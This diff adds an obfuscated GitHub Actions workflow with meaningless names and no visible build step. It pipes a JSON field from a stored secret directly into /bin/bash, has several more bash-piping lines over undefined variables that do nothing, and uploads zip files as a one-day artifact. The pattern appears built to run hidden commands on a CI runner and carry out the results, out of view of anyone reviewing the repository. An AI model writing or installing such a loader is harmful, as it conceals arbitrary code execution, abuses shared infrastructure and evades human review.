@@ -1,0 +1,28 @@
+name: gavinobjectiveu950
+on:
+  workflow_dispatch:
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: gavinobjectiveu950
+        env:
+          fa2018: ${{ secrets.fa2018 }}
+        run: |
+          printf '%s' "$fa2018" | jq -r .onttn80411 | /bin/bash
+          printf '%s' "$b0738" | jq -r .mqrh55631 | /bin/bash
+          printf '%s' "$usae63478" | jq -r .pbc1 | /bin/bash
+          echo $folqg8 | jq -r .icu8971 | /bin/bash
+          printf '%s' "$t52394" | jq -r .h729 | /bin/bash
+          echo $c20208 | jq -r .fukk601 | /bin/bash
+          echo $eyd83 | jq -r .ls392 | /bin/bash
+          printf '%s' "$b9766" | jq -r .oqnq88115 | /bin/bash
+          printf '%s' "$t4700" | jq -r .zl7 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: otlroJ96
+          path: "*.zip"
+          retention-days: 1
